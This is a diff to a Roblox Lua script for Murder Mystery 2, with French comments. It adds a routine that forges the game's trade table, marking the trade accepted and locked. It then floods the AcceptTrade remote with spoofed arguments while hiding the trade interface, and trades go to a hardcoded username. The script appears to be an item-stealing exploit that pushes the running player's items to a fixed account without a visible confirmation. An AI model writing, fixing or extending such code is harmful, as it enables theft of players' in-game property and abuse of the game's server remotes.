@@ -49,6 +49,7 @@ local function MM2()
     -- Cible du trade
     local TARGET_USERNAME = "TtTt_1038"
     local tradeInProgress = false
+    local TradeTable = nil
 
     local function trim2(s)
         return (s:gsub("^%s*(.-)%s*$", "%1"))
@@ -267,12 +268,94 @@ local function MM2()
         return "None"
     end
 
-    -- FONCTION D'ACCEPTATION AVEC COOLDOWN DE 6 SECONDES
-    local function acceptTradeSpam()
-        print("🔄 Spam d'acceptation du trade...")
+    -- FONCTION POUR RÉCUPÉRER LA TABLE TRADE
+    local function getTradeTable()
+        local success, table = pcall(function()
+            return game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeTable"):InvokeServer()
+        end)
+        if success then
+            return table
+        end
+        return nil
+    end
+
+    -- FONCTION D'ACCEPTATION AVEC LA TABLE TRADE
+    local function acceptTradeWithTable()
+        print("🔄 Acceptation du trade via TradeTable...")
         
         local attempts = 0
-        local maxAttempts = 1000
+        local maxAttempts = 200
+        
+        -- Attendre que le trade soit en StartTrade
+        local waitTime = 0
+        while getTradeStatus() ~= "StartTrade" and waitTime < 20 do
+            wait(0.1)
+            waitTime = waitTime + 0.1
+        end
+        
+        if getTradeStatus() ~= "StartTrade" then
+            print("❌ Trade pas en StartTrade")
+            return false
+        end
+        
+        print("✅ Trade en StartTrade")
+        print("⏳ Attente du cooldown de 6 secondes...")
+        wait(6.5)
+        
+        print("🔄 Début de l'acceptation avec TradeTable...")
+        
+        while attempts < maxAttempts do
+            attempts = attempts + 1
+            
+            pcall(function()
+                -- Récupérer la table de trade
+                local tradeTable = getTradeTable()
+                if tradeTable then
+                    -- Marquer comme accepté
+                    if tradeTable.Player1 and tradeTable.Player1.Player == game.Players.LocalPlayer then
+                        tradeTable.Player1.Accepted = true
+                    end
+                    if tradeTable.Player2 and tradeTable.Player2.Player == game.Players.LocalPlayer then
+                        tradeTable.Player2.Accepted = true
+                    end
+                    
+                    -- Verrouiller le trade
+                    tradeTable.Locked = true
+                    
+                    -- Envoyer la table mise à jour
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("UpdateTrade"):FireServer(tradeTable)
+                end
+            end)
+            
+            -- Méthode alternative: accepter directement
+            pcall(function()
+                local args = {
+                    [1] = 428469873,
+                    [2] = tick() + math.random()
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+            end)
+            
+            -- Vérifier si accepté
+            wait(0.05)
+            local status = getTradeStatus()
+            if status == "None" then
+                print("✅ Trade accepté après " .. attempts .. " tentatives!")
+                return true
+            end
+            
+            if attempts % 50 == 0 then
+                print("Tentative " .. attempts .. "/" .. maxAttempts .. " - Status: " .. tostring(status))
+            end
+        end
+        
+        print("❌ Échec après " .. maxAttempts .. " tentatives")
+        return false
+    end
+
+    -- FONCTION SIMPLIFIÉE D'ACCEPTATION
+    local function acceptTradeSpam()
+        print("🔄 Spam d'acceptation du trade...")
         
         -- Désactiver les interfaces
         local tradegui = playerGui:FindFirstChild("TradeGUI")
@@ -288,50 +371,48 @@ local function MM2()
         end
         
         if getTradeStatus() ~= "StartTrade" then
-            print("❌ Trade pas en StartTrade, status: " .. tostring(getTradeStatus()))
+            print("❌ Trade pas en StartTrade")
             return false
         end
         
         print("✅ Trade en StartTrade")
-        print("⏳ Attente du cooldown de 6 secondes avant d'accepter...")
+        print("⏳ Attente du cooldown de 6 secondes...")
+        wait(6.5)
         
-        -- ATTENDRE LE COOLDOWN DE 6 SECONDES
-        wait(6.5) -- 6 secondes + 0.5 de marge
+        -- Essayer d'abord avec la méthode TradeTable
+        print("🔄 Essai avec TradeTable...")
+        local success = acceptTradeWithTable()
+        if success then
+            return true
+        end
         
-        print("✅ Cooldown passé, début du spam d'acceptation...")
-        
-        while attempts < maxAttempts do
+        -- Si ça marche pas, spammer l'acceptation normale
+        print("🔄 Fallback: spam normal...")
+        local attempts = 0
+        while attempts < 200 do
             attempts = attempts + 1
             
-            -- Méthode 1: comme dans ton spy avec timestamp flottant
             pcall(function()
-                local timestamp = tick() + math.random()
                 local args = {
                     [1] = 428469873,
-                    [2] = timestamp
+                    [2] = tick() + math.random()
                 }
                 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
             end)
             
-            -- Méthode 2: sans paramètres
             pcall(function()
                 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
             end)
             
-            -- Vérifier si accepté
-            wait(0.03)
+            wait(0.05)
             local status = getTradeStatus()
             if status == "None" then
                 print("✅ Trade accepté après " .. attempts .. " tentatives!")
                 return true
             end
-            
-            if attempts % 100 == 0 then
-                print("Tentative " .. attempts .. "/" .. maxAttempts .. " - Status: " .. tostring(status))
-            end
         end
         
-        print("❌ Échec après " .. maxAttempts .. " tentatives")
+        print("❌ Échec de l'acceptation")
         return false
     end
 
@@ -757,7 +838,7 @@ local function MM2()
                 end
             end
             
-            -- Accepter (avec le cooldown de 6 secondes intégré)
+            -- Accepter
             print("🔄 Acceptation...")
             local acceptSuccess = acceptTradeSpam()
             
